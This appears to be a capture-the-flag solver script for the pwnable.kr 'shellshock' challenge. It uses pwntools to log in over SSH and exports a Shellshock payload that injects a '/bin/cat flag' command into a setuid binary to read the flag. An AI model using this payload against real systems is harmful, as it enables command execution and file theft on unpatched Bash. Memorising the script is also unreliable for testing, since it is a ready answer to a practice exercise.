from pwn import *

REMOTE_ADDRESS = "pwnable.kr"
REMOTE_PORT = 2222
REMOTE_USERNAME = "shellshock"
REMOTE_PASSWORD = "guest"

shell = ssh(host = REMOTE_ADDRESS, port = REMOTE_PORT, user = REMOTE_USERNAME, password = REMOTE_PASSWORD)
sh = shell.run("/bin/sh")

sh.sendline(b"export vul='() { :;}; /bin/cat flag'")
sh.sendline(b"./shellshock")

flag = sh.recvline().decode().strip().replace("$ ", "")

sh.close()
shell.close()

print(f"Flag is: {flag}")